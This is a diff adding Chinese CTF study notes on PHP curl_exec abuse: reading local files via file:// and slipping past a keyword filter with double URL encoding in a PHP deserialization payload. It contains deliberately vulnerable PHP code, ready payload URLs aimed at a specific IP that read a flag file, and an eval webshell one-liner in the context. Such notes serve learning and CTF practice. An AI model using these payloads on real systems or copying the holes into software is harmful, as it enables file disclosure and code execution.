@@ -14,6 +14,72 @@ preg_replace_callback("/.*/",function ($a){@eval($a[0]);},$_GET["h"]);
 
 利用条件:php版本=7
 
+### curl_exec 
+
+#### 利用file://伪协议可以任意文件读取
+
+漏洞代码
+
+```php
+function test() {
+    	$a=$_GET['a']
+        $c = curl_init();
+        curl_setopt($c, CURLOPT_URL, $this->a);
+        curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);
+        curl_setopt($c, CURLOPT_CONNECTTIMEOUT, 5);
+        echo curl_exec($c);
+    }
+```
+
+利用方式http://47.97.253.115:10006/?z=file://localhost/flag
+
+
+
+#### 利用二次url编码绕过字符串限制
+
+因为curl_exec会对url进行解码,所以我们可以通过对传递字符串二次编码,来绕过字符串限制
+
+漏洞代码
+
+```php
+<?php
+
+class Hello {
+    protected $a;
+
+    function test() {
+        $b = strpos($this->a, 'flag');
+        if($b) {
+            die("Bye!");
+        }
+        $c = curl_init();
+        curl_setopt($c, CURLOPT_URL, $this->a);
+        curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);
+        curl_setopt($c, CURLOPT_CONNECTTIMEOUT, 5);
+        echo curl_exec($c);
+    }
+    
+    function __destruct(){
+        $this->test();
+    }
+}
+
+if (isset($_GET["z"])) {
+    unserialize($_GET["z"]);
+} else {
+    highlight_file(__FILE__);
+}
+```
+
+payload:
+
+http://47.97.253.115:10006/?z=O:5:%22Hello%22:1:{s:1:%22a%22;s:23:%22file://localhost/%2566lag%22;}
+
+这里有一些坑就是:
+
+1. 你不知道flag文件在哪个文件夹,结果最后就在根目录。。
+2. 因为是二次编码所以要注意字符串的长度
+
 ### preg_replace()
 
 preg_replace漏洞触发有两个前提：
